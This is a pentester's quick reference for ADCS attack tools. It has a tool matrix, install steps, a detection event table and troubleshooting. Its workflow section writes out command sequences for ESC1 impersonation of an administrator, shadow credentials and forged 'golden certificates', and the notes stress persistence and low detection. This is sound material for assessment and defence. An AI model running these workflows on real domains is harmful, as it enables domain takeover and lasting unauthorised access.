# ADCS Tools Quick Reference

## Quick Comparison Matrix

| Tool | Language | Platform | Primary Use Case | ESC Support |
|------|----------|----------|------------------|-------------|
| **Certipy** | Python | Linux/Windows | All-in-one ADCS exploitation | ESC1-ESC16 |
| **Certify** | C# | Windows | Template enumeration & abuse | ESC1-ESC8 |
| **Whisker** | C# | Windows | Shadow credentials | N/A |
| **pyWhisker** | Python | Linux | Shadow credentials | N/A |
| **PKINITtools** | Python | Linux | PKINIT authentication | Post-exploit |
| **PassTheCert** | C# | Windows | LDAP cert authentication | Post-exploit |
| **ForgeCert** | C# | Windows | Certificate forgery | Post-exploit |
| **ADCSKiller** | Python | Linux | Automated exploitation | Multiple |
| **Rubeus** | C# | Windows | Kerberos attacks | Supporting |

## Tool Selection Guide

### Initial Enumeration
- **Primary**: Certipy (`find` command)
- **Alternative**: Certify (`find /vulnerable`)
- **Automated**: ADCSKiller

### Certificate Request Exploitation (ESC1-ESC7)
- **Linux**: Certipy
- **Windows**: Certify
- **Automated**: ADCSKiller

### Shadow Credentials
- **Linux**: pyWhisker
- **Windows**: Whisker
- **Requirements**: Windows Server 2016+ DC with PKINIT support

### NTLM Relay (ESC8)
- **Primary**: Certipy (relay mode)
- **Supporting**: Impacket ntlmrelayx

### Certificate Authentication
- **Kerberos (PKINIT)**: PKINITtools
- **LDAP/S**: PassTheCert
- **All-in-one**: Certipy (`auth` command)

### Certificate Forgery
- **With CA keys**: ForgeCert
- **Alternative**: Certipy (`forge` command)

## Common Attack Workflows

### Workflow 1: ESC1 Template Abuse

```bash
# Linux (Recommended)
certipy find -u user@domain.local -p password -dc-ip DC_IP
certipy req -u user@domain.local -p password -ca CA-NAME -target CA_IP -template VulnTemplate -upn admin@domain.local
certipy auth -pfx admin.pfx -dc-ip DC_IP
```

```powershell
# Windows
Certify.exe find /vulnerable
Certify.exe request /ca:CA-NAME /template:VulnTemplate /altname:Administrator
Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:pfxpass /ptt
```

### Workflow 2: Shadow Credentials Attack

```bash
# Linux
python pywhisker.py -d domain.local -u user -p password --target victim --action add -f victim.pfx
python gettgtpkinit.py domain.local/victim -cert-pfx victim.pfx victim.ccache
export KRB5CCNAME=victim.ccache
```

```powershell
# Windows
Whisker.exe add /target:victim
Rubeus.exe asktgt /user:victim /certificate:cert.pfx /password:pass /nowrap
```

### Workflow 3: Certificate Forgery

```bash
# Prerequisites: Compromised CA certificate + private key
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword pass --Subject "CN=User" --SubjectAltName admin@domain.local --NewCertPath forged.pfx

# Then authenticate
certipy auth -pfx forged.pfx -dc-ip DC_IP
```

## Installation Quick Start

### Python Tools

```bash
# Certipy
pip install certipy-ad

# PKINITtools
git clone https://github.com/dirkjanm/PKINITtools
cd PKINITtools
pip install -r requirements.txt

# pyWhisker
git clone https://github.com/ShutdownRepo/pywhisker
cd pywhisker
pip install -r requirements.txt

# ADCSKiller
git clone https://github.com/grimlockx/ADCSKiller
cd ADCSKiller
pip install -r requirements.txt
```

### C# Tools (Compilation Required)

```bash
# Clone and build
git clone https://github.com/GhostPack/Certify
cd Certify/Certify
dotnet build -c Release

# Or download pre-compiled from releases
# Check each repository's releases page
```

## Feature Comparison

### Certipy Capabilities
✅ Certificate enumeration
✅ All ESC techniques (ESC1-ESC16)
✅ Shadow credentials
✅ Certificate authentication
✅ Certificate forgery
✅ NTLM relay
✅ Cross-platform
❌ Requires Python

### Certify Capabilities
✅ Certificate enumeration
✅ Template abuse (ESC1-ESC8)
✅ Detailed reporting
✅ Native Windows execution
❌ Windows-only
❌ No authentication features

### Whisker/pyWhisker Capabilities
✅ Shadow credentials manipulation
✅ msDS-KeyCredentialLink modification
✅ List/Add/Remove credentials
❌ Requires PKINIT support
❌ Requires Windows Server 2016+

### PKINITtools Capabilities
✅ Kerberos PKINIT authentication
✅ TGT request with certificates
✅ NT hash extraction
✅ S4U ticket requests
❌ Post-exploitation only
❌ Requires valid certificate

## Detection Indicators

| Tool | Primary Events | Network Indicators |
|------|----------------|-------------------|
| Certipy | 4886, 4887, 4768 | HTTP to CA web enrollment |
| Certify | 4886, 4887 | DCOM/RPC to CA |
| Whisker | 5136 (msDS-KeyCredentialLink) | LDAP modifications |
| PKINITtools | 4768 (PKINIT) | Kerberos PKINIT traffic |
| PassTheCert | 4768, 3074 | LDAPS authentication |
| ForgeCert | 4768, 4769 | Kerberos with forged cert |

## Tool-Specific Notes

### Certipy
- Most versatile and actively maintained
- Best for Linux-based attacks
- Supports latest Windows patches
- Regular updates for new techniques

### Certify
- Part of GhostPack suite
- Excellent for Windows-native operations
- Great enumeration output
- Pairs well with other GhostPack tools

### Whisker/pyWhisker
- Requires specific environment
- Very powerful for persistence
- Low detection if done carefully
- Certificate persists after credential change

### PKINITtools
- Essential for Linux-based certificate authentication
- Requires impacket
- Works well with Certipy output
- Can be used with shadow credentials

### ForgeCert
- Requires CA compromise
- Provides long-term persistence
- Creates "golden certificates"
- Very difficult to detect/remediate

### ADCSKiller
- Good for initial automated assessment
- Combines Certipy and Coercer
- May be noisy
- Best for CTF/lab environments

## Troubleshooting

### Common Issues

**Certipy: "Failed to resolve DC"**
- Solution: Use `-dc-ip` parameter explicitly

**Certify: "Access Denied"**
- Solution: Check user permissions on template
- Run `Certify.exe find` to see accessible templates

**Whisker: "Key credentials not supported"**
- Solution: Verify DC is Windows Server 2016+
- Check DC has PKINIT certificate

**PKINITtools: "KDC has no support for padata type"**
- Solution: DC doesn't support PKINIT
- Use PassTheCert instead

**ForgeCert: Certificate validation errors**
- Solution: Check CA certificate chain
- Ensure correct certificate attributes

## Recommended Learning Path

1. **Start with enumeration**
   - Use Certipy/Certify to understand the environment
   - Identify vulnerable configurations

2. **Practice basic exploits**
   - ESC1: Most common and straightforward
   - ESC8: NTLM relay to web enrollment

3. **Learn shadow credentials**
   - Understand msDS-KeyCredentialLink
   - Practice with Whisker/pyWhisker

4. **Master authentication**
   - PKINITtools for Kerberos
   - PassTheCert for LDAP

5. **Advanced techniques**
   - Certificate forgery
   - Persistence mechanisms
   - Defensive evasion

## Additional Resources

### Lab Environments
- GOAD (Game of Active Directory)
- DetectionLab
- Vulnerable AD labs on GitHub

### Training
- SpecterOps "Certified Pre-Owned" whitepaper
- PentesterLab ADCS course
- HackTheBox Pro Labs

### Community
- BloodHound Slack
- SpecterOps blog
- GhostPack repositories

---

**Quick Tip**: For most scenarios, start with Certipy on Linux or Certify on Windows. These tools cover 80% of common ADCS exploitation scenarios.
